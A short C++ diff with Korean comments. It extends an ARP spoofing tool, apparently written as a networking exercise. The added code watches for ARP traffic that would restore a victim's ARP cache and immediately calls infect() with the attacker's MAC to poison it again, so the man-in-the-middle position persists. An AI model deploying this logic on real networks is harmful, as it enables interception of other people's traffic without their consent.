@@ -200,6 +200,22 @@ int main(int argc, char* argv[]) {
 		}
 
 		EthHdr* ethHdr = (EthHdr*)pkt;
+
+		// ARP 패킷 감시: recover 감지
+		if (ethHdr->type() == EthHdr::Arp) {
+			ArpHdr* arpHdr = (ArpHdr*)(pkt + sizeof(EthHdr));
+			for (const Flow& flow : flows) {
+				bool fromTarget = (arpHdr->sip() == flow.targetIp && arpHdr->tip() == flow.senderIp); // Target이 Sender에게 보내는 ARP 패킷
+				bool fromSender = (arpHdr->sip() == flow.senderIp && arpHdr->tip() == flow.targetIp); // Sender가 브로드캐스트로 Target을 찾는 ARP Request
+				if (fromTarget || fromSender) {
+					printf("%s > recover detected, re-infecting\n", std::string(flow.senderIp).c_str());
+					infect(pcap, attackerMac, flow);
+					break;
+				}
+			}
+			continue;
+		}
+
 		if (ethHdr->type() != EthHdr::Ip4) continue;
 		if (ethHdr->dmac() != attackerMac) continue;
 
